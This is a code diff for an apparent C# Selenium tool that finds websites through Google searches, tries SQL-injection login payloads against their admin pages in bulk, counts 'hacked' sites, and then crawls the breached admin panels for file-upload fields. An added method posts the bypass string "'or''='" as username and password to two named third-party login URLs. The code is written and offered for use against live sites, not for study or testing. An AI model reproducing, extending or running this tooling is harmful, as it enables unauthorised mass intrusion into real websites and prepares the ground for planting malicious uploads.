@@ -5,9 +5,11 @@ using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.Net.Http;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Linq;
 
 namespace ADHWithSelenium
 {
@@ -15,12 +17,13 @@ namespace ADHWithSelenium
     {
         bool isStop = false;
         Random random = new Random();
-        public delegate void MyDelegate(string url, string progress);
-        private void UpdateLabel(string url, string progress)
+        public delegate void MyDelegate(string url, string msg, string progress);
+        private void UpdateLabel(string url, string msg, string progress)
         {
             Invoke(new Action(() => {
                 label10.Text = (url != "") ? url : label10.Text;
-                label11.Text = (progress != "") ? progress : label11.Text;
+                label11.Text = (msg != "") ? msg : label11.Text;
+                label12.Text = (progress != "") ? progress : label12.Text;
             })); 
         }
         public Home()
@@ -32,6 +35,7 @@ namespace ADHWithSelenium
             comboBox1.SelectedIndex = 0;
             comboBox2.SelectedIndex = 0;
             comboBox3.SelectedIndex = 0;
+            comboBox4.SelectedIndex = 0;
             listView1.CheckBoxes = true;
         }
 
@@ -40,7 +44,7 @@ namespace ADHWithSelenium
         private async void CrawlUrls(object sender, EventArgs e)
         {          
             listView1.Items.Clear();
-            label11.Text = "";
+            ResetProgress();
             MyDelegate myDelegate = new MyDelegate(UpdateLabel);
             
             if (textBox1.Text != "")
@@ -53,7 +57,8 @@ namespace ADHWithSelenium
                 //driver.Manage().Window.Maximize();
 
                 string searchQuery = textBox1.Text;
-                driver.Navigate().GoToUrl("https://www.google.com/search?q=" + searchQuery);
+                bool isSuccessful = Navigate(driver, "https://www.google.com/search?q=" + searchQuery);
+
                 int pages = 1;
                 int noOfPages = int.Parse(comboBox1.Text);
 
@@ -76,7 +81,7 @@ namespace ADHWithSelenium
                                 Invoke(new Action(() => {
                                     listView1.Items.Add(url);
                                 }));
-                                myDelegate.DynamicInvoke("", urlCounter.ToString());
+                                myDelegate.DynamicInvoke(url, "Found Websites", urlCounter.ToString());
                                 urlCounter++;
                             }  
                         }); 
@@ -111,6 +116,7 @@ namespace ADHWithSelenium
 
         private async void HackDomain(object sender, EventArgs e)
         {
+            ResetProgress();
             isStop = false;
             MyDelegate myDelegate = new MyDelegate(UpdateLabel);
 
@@ -118,7 +124,7 @@ namespace ADHWithSelenium
             string[] urls = File.ReadAllLines(label5.Text);
             string[] payloads = File.ReadAllLines(label4.Text);
 
-            IWebDriver driver = (comboBox2.Text == "Google Chrome") ? (IWebDriver)CreateChromeDriver(false) : (IWebDriver)CreateFirefoxDriver(false);
+            IWebDriver driver = (comboBox2.Text == "Google Chrome") ? (IWebDriver)CreateChromeDriver(checkBox1.Checked) : (IWebDriver)CreateFirefoxDriver(checkBox1.Checked);
      
             foreach (string url in urls)
             {
@@ -127,7 +133,7 @@ namespace ADHWithSelenium
             }
             int lwCount = 0;
             int attempts = 0;
-            myDelegate.DynamicInvoke("", "A: " + attempts.ToString() + "/" + urls.Length * payloads.Length + "    H: 0");
+            myDelegate.DynamicInvoke("","Attempts/Total Attempts  Hacked", attempts.ToString() + "/" + urls.Length * payloads.Length + "  0");
             foreach (string payload in payloads)
             {
                 int counter = 0;
@@ -145,7 +151,7 @@ namespace ADHWithSelenium
                             try
                             {
                                 driver.SwitchTo().Window(driver.WindowHandles[counter]);
-                                driver.Navigate().GoToUrl(url);
+                                Navigate(driver, url);
                             }
                             catch (Exception ex)
                             {
@@ -189,7 +195,7 @@ namespace ADHWithSelenium
                         }
                         catch (Exception) { }
 
-                        myDelegate.DynamicInvoke(url, "A: "+attempts.ToString()+"/"+urls.Length*payloads.Length+"    H: " + listView2.Items.Count.ToString());
+                        myDelegate.DynamicInvoke(url, "Attempts/Total Attempts  Hacked", attempts.ToString()+"/"+urls.Length*payloads.Length+"  " + listView2.Items.Count.ToString());
                     
                     }
                     catch (Exception) { continue; }
@@ -200,12 +206,17 @@ namespace ADHWithSelenium
         }        
         private async void FindUploadPoints(object sender, EventArgs e)
         {
+            ResetProgress();
             isStop = false;
             await Task.Run(() => {
-                IWebDriver chromeDriver = CreateChromeDriver(false);
-                IWebDriver firefoxDriver = CreateFirefoxDriver(false);
+                IWebDriver chromeDriver = CreateChromeDriver(checkBox2.Checked);
+                IWebDriver firefoxDriver = CreateFirefoxDriver(checkBox2.Checked);
 
-                Invoke(new Action(() => listView3.Items.Clear())); 
+                Invoke(new Action(() => { 
+                    listView3.Items.Clear();
+                    label10.Text = "";
+                    label11.Text = "";
+                })); 
 
                 string[] domains = File.ReadAllText(label8.Text).Trim().Split('\n');
                 int listCounter = 0;
@@ -219,23 +230,32 @@ namespace ADHWithSelenium
                         firefoxDriver.Dispose();
                         return;
                     }
-                    string[] line = data.Split(new String[] { "|" }, 2, StringSplitOptions.None);
+                    string[] line = data.Split(new [] { "|" }, 2, StringSplitOptions.None);
                     Uri uri = new Uri(line[0].Trim());
                     string domain = uri.Scheme + "://" + uri.Host;
                     string loginUrl = line[0].Trim();
                     string payload = line[1].Trim().Split('|')[0];
-
+                    myDelegate.DynamicInvoke(domain, "Logging In","");
                     Login(chromeDriver, loginUrl, payload);
                     string homePage = (FindUploadPointAtHomePage(chromeDriver)) ? chromeDriver.Url : null;
                     Login(firefoxDriver, loginUrl, payload);
+                    myDelegate.DynamicInvoke(domain, "Logged In","");
 
-                    List<string> urls = FindAllUrls(chromeDriver, domain);
+                    List<string> urls = FindAllUrls(chromeDriver, firefoxDriver, domain).Distinct().ToList();
+                    myDelegate.DynamicInvoke(domain, "Removing duplicate URLs","");
+                    Thread.Sleep(3000);
+                    myDelegate.DynamicInvoke(domain, "Unique URLs", urls.Count().ToString());
+                    Thread.Sleep(3000);
                     Invoke(new Action(() => {
-                        listView3.Items.Add(domain);
-                        listView3.Items[listCounter].SubItems.Add(urls.Count.ToString());
+                        ListViewItem item = new ListViewItem();
+                        item.Text = domain;
+                        item.SubItems.Add(urls.Count.ToString());
+                        item.SubItems.Add("");
+                        listView3.Items.Add(item);
+
                         if(homePage != null)
                         {
-                            listView3.Items[listCounter].SubItems.Add(homePage);
+                            listView3.Items[listCounter].SubItems[2].Text = homePage;
                         } 
                     }));
 
@@ -250,15 +270,19 @@ namespace ADHWithSelenium
                             return;
                         }
                         Thread.Sleep(random.Next(5, 50) * 100);
-                        myDelegate.DynamicInvoke(url, (urlCounter + 1).ToString() + "/" + urls.Count.ToString());
+                        myDelegate.DynamicInvoke(url, "Finding Upload Points", (urlCounter + 1).ToString() + "/" + urls.Count.ToString());
                         if (urlCounter % 2 == 0)
                         {
                             //chrome
                             try
                             {                             
-                                chromeDriver.Navigate().GoToUrl(url);
+                                Navigate(chromeDriver,url);
                                 IWebElement webElement = chromeDriver.FindElement(By.CssSelector("input[type = file]"));
-                                Invoke(new Action(() => listView3.Items[listCounter].SubItems[2].Text += "|"+ url));
+                                Invoke(new Action(() =>
+                                {
+                                    string txt = listView3.Items[listCounter].SubItems[2].Text;
+                                    listView3.Items[listCounter].SubItems[2].Text = txt == "" ? url : txt += "|" + url;
+                                }));
                                 urlCounter++;
                             }
                             catch (Exception)
@@ -272,7 +296,7 @@ namespace ADHWithSelenium
                             //firefox
                             try
                             {
-                                firefoxDriver.Navigate().GoToUrl(url);
+                                Navigate(firefoxDriver,url);
                                 IWebElement webElement = firefoxDriver.FindElement(By.CssSelector("input[type = file]"));
                                 Invoke(new Action(() => listView3.Items[listCounter].SubItems.Add(url)));
                                 urlCounter++;
@@ -296,7 +320,9 @@ namespace ADHWithSelenium
 
         private void Login(IWebDriver driver, string loginUrl, string payload)
         {
-            driver.Navigate().GoToUrl(loginUrl);
+            bool isSuccessful = Navigate(driver,loginUrl);
+            if (!isSuccessful) { return; }
+            Thread.Sleep(2000);
             //USER ID/EMAIL/USERNAME
             try
             {
@@ -364,7 +390,6 @@ namespace ADHWithSelenium
             {
                 var elements = driver.FindElements(By.CssSelector("button"));
                 elements[elements.Count - 1].Click();
-
             }
             catch (Exception) { }
         }
@@ -380,21 +405,125 @@ namespace ADHWithSelenium
                 return false;
             }
         }
-        private List<string> FindAllUrls(IWebDriver driver, string domain)
+        private List<string> FindAllUrls(IWebDriver chromeDriver, IWebDriver firefoxDriver, string domain)
         {
             //Find all admin urls
             List<string> urls = new List<string>();
-            var links = driver.FindElements(By.TagName("a"));
+            MyDelegate myDelegate = new MyDelegate(UpdateLabel);
+            Thread.Sleep(5000);
+            var links = firefoxDriver.FindElements(By.TagName("a"));
+            while(links.Count == 0)
+            {
+                Thread.Sleep(5000);
+                links = firefoxDriver.FindElements(By.TagName("a"));
+            }
+            //Websire Creawl level 1
             foreach (var link in links)
             {
-                var href = link.GetAttribute("href");
+                string l = link.GetAttribute("href");
+                var href = l.Contains("#") ? l : l.Replace("#","");
+                href = (href.LastIndexOf('/') == href.Length - 1) ? href.Remove(href.LastIndexOf('/'), 1) : href;
                 if (href != domain && !href.Contains("logout") && !href.Contains("signout") && !href.Contains("login"))
                 {
-                    urls.Add(href);
+                    bool isAlreadyExist = false;
+                    foreach(string url in urls)
+                    {
+                        if(url == href)
+                        {
+                            isAlreadyExist = true;
+                            break;
+                        }
+                    }  
+                    if(!isAlreadyExist)
+                    {
+                        urls.Add(href);
+                        myDelegate.DynamicInvoke(domain, "Found Admin URLs", urls.Count.ToString());
+                    }
+                }
+            }
+            //Website Crawl Level 2
+            int websiteCrawlLevel = 0;
+            Invoke(new Action(() => websiteCrawlLevel = int.Parse(comboBox4.Text)));
+            if(websiteCrawlLevel == 2)
+            {
+                int urlsAtHomeCount = urls.Count();
+                int count = 0;
+                int switching = 0;
+                while (count < urlsAtHomeCount)
+                {
+                    if (switching % 2 == 0)
+                    {
+                        urls.AddRange(FindDeepUrls(firefoxDriver, domain, urls.ElementAt(count)));
+                        switching++;
+                    }
+                    else
+                    {
+                        urls.AddRange(FindDeepUrls(chromeDriver, domain, urls.ElementAt(count)));
+                        switching++;
+                    }
+                    myDelegate.DynamicInvoke(domain, "Found Admin URLs", urls.Count.ToString());
+                    count++;
+                }
+            }
+            //Website Crawl Level 3
+            int websiteCrawlLevel3 = 0;
+            Invoke(new Action(() => websiteCrawlLevel3 = int.Parse(comboBox4.Text)));
+            if (websiteCrawlLevel == 3)
+            {
+                int urlsAtHomeCount3 = urls.Count();
+                int count3 = 0;
+                int switching3 = 0;
+                while (count3 < urlsAtHomeCount3)
+                {
+                    if (switching3 % 2 == 0)
+                    {
+                        urls.AddRange(FindDeepUrls(firefoxDriver, domain, urls.ElementAt(count3)));
+                        switching3++;
+                    }
+                    else
+                    {
+                        urls.AddRange(FindDeepUrls(chromeDriver, domain, urls.ElementAt(count3)));
+                        switching3++;
+                    }
+                    myDelegate.DynamicInvoke(domain, "Found Admin URLs", urls.Count.ToString());
+                    count3++;
                 }
             }
             return urls;
         }
+        private List<string> FindDeepUrls(IWebDriver driver, string domain, string currentUrl)
+        {
+            Navigate(driver, currentUrl);
+            List<string> urls = new List<string>();
+            var links = driver.FindElements(By.TagName("a"));
+            foreach (var link in links)
+            {
+                string l = link.GetAttribute("href");
+                if(l != null)
+                {
+                    var href = l.Contains("#") ? l : l.Replace("#", "");
+                    href = (href.LastIndexOf('/') == href.Length - 1) ? href.Remove(href.LastIndexOf('/'), 1) : href;
+                    if (href != domain && !href.Contains("logout") && !href.Contains("signout") && !href.Contains("login"))
+                    {
+                        bool isAlreadyExist = false;
+                        foreach (string url in urls)
+                        {
+                            if (url == href)
+                            {
+                                isAlreadyExist = true;
+                                break;
+                            }
+                        }
+                        if (!isAlreadyExist)
+                        {
+                            urls.Add(href);
+                        }
+                    }
+                }  
+            }
+            return urls;
+        }
+
 
         private void Export(object sender, EventArgs e)
         {
@@ -462,6 +591,24 @@ namespace ADHWithSelenium
             }
         }
 
+        private bool Navigate(IWebDriver driver, string url)
+        {
+            int i = 0;
+            while (i < 5)
+            {
+                try
+                {
+                    driver.Navigate().GoToUrl(url);
+                    break;
+                }
+                catch (Exception)
+                {
+                    i++;
+                    continue;
+                }
+            }
+            return i < 5 ? true : false;
+        }
         public void KillProcesses()
         {
             Process[] driverProcesses = Process.GetProcessesByName("chrome");
@@ -490,8 +637,8 @@ namespace ADHWithSelenium
             ChromeDriverService service = ChromeDriverService.CreateDefaultService();
             service.HideCommandPromptWindow = true;
             //TimeSpan.FromSeconds is the max time for request to timeout
-            ChromeDriver driver = new ChromeDriver(service, options, TimeSpan.FromSeconds(random.Next(40, 60)));
-            driver.Manage().Timeouts().PageLoad.Add(TimeSpan.FromSeconds(random.Next(10, 20)));
+            ChromeDriver driver = new ChromeDriver(service, options, TimeSpan.FromSeconds(random.Next(40, 100)));
+            driver.Manage().Timeouts().PageLoad = TimeSpan.FromSeconds(50);
             //int screenWidth = int.Parse(SystemParameters.FullPrimaryScreenWidth.ToString());
             //driver.Manage().Window.Size = new System.Drawing.Size(screenWidth, 100);
             //driver.Manage().Window.Position = new System.Drawing.Point(0, 0);
@@ -515,8 +662,8 @@ namespace ADHWithSelenium
             options.AddArgument("--no-sandbox");
             FirefoxDriverService service = FirefoxDriverService.CreateDefaultService();
             service.HideCommandPromptWindow = true;
-            FirefoxDriver driver = new FirefoxDriver(service, options, TimeSpan.FromSeconds(random.Next(40, 60)));
-            driver.Manage().Timeouts().PageLoad.Add(TimeSpan.FromSeconds(random.Next(10, 20)));
+            FirefoxDriver driver = new FirefoxDriver(service, options, TimeSpan.FromSeconds(random.Next(40, 100)));
+            driver.Manage().Timeouts().PageLoad = TimeSpan.FromSeconds(50);
             //int screenWidth = int.Parse(SystemParameters.FullPrimaryScreenWidth.ToString());
             //driver.Manage().Window.Size = new System.Drawing.Size(screenWidth, 100);
             //int screenHeight = int.Parse(SystemParameters.FullPrimaryScreenHeight.ToString());
@@ -528,21 +675,67 @@ namespace ADHWithSelenium
             else
             {
                 driver.Manage().Window.Maximize();
-            }
+            }         
             return driver;
         }
 
         private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
         {
+            ResetProgress();
+        }
+        private void ResetProgress()
+        {
             label10.Text = "";
             label11.Text = "";
+            label12.Text = "";
         }
-
         private void Stop(object sender, EventArgs e)
         {
             isStop = true;
         }
 
         
+
+
+
+        private async void LoginByHttpRequest(string loginUrl, string payload)
+        {
+            //var client = new RestClient("https://resulthost.in/demo/online-certificate-verification/login.php");
+            //client.Timeout = -1;
+            //var request = new RestRequest(Method.POST);
+            //request.AddHeader("Cookie", "PHPSESSID=9096404d6efa23226fc59700b9f29291");
+            //request.AlwaysMultipartFormData = true;
+            //request.AddParameter("username", "'or''='");
+            //request.AddParameter("password", "'or''='");
+            //IRestResponse response = client.Execute(request);
+            //Console.WriteLine(response.Content);
+
+            string url = "https://resulthost.in/demo/online-certificate-verification/login.php";
+            string url1 = "https://nidj.ac.in/studentcorner/logincheck.php";
+            var data = new Dictionary<string, string>
+            {
+                {"username", "'or''='"},
+                {"password", "'or''='"}
+            };
+            var client = new HttpClient();
+            var res = await client.PostAsync(url1, new FormUrlEncodedContent(data));
+            var content = await res.Content.ReadAsStringAsync();
+
+            var loginModel = new LoginModel { Username = "'or''='", Password = "'or''='" };
+            //var json = JsonConvert.SerializeObject(loginModel);
+            //var formData = new StringContent(json.ToLower(), Encoding.UTF8, "application/json");
+            //HttpClient client = new HttpClient();
+            //HttpRequestMessage request = new HttpRequestMessage();
+            //request.Method = HttpMethod.Post;
+            //request.RequestUri = new Uri();
+            //request.Content = formData;
+            //request.Content.Headers.ContentLength = 500;
+            //request.Headers.Add("content-length", "300");
+            
+            
+            //var response = await client.SendAsync(request);
+            //var result = await response.Content.ReadAsStringAsync();
+        }
+
     }
 }
